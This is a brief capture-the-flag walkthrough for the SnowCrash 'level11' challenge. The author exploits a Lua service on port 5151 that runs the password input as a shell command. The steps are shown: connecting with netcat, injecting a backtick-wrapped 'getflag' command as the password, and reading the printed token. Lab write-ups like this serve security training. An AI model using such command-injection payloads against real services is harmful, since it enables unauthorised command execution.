# Level11

We are greeted by a `level11.lua` file owned by `flag11` in our home directory. After a brief read, it appears to start a server running on port 5151. When trying to run the script, it tells us: `address already in use`. This indicates the server is running already.

```
level11@SnowCrash:~$ nc localhost 5151
Password:
```

When connecting with `netcat` we are prompted to enter a password. Looking at the `function hash(pass)` in the lua script, we see our input is directly executed as a shell command...

```
level11@SnowCrash:~$ netcat localhost 5151
Password: `getflag > /tmp/flag`
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Easy enough. Onto `su level12`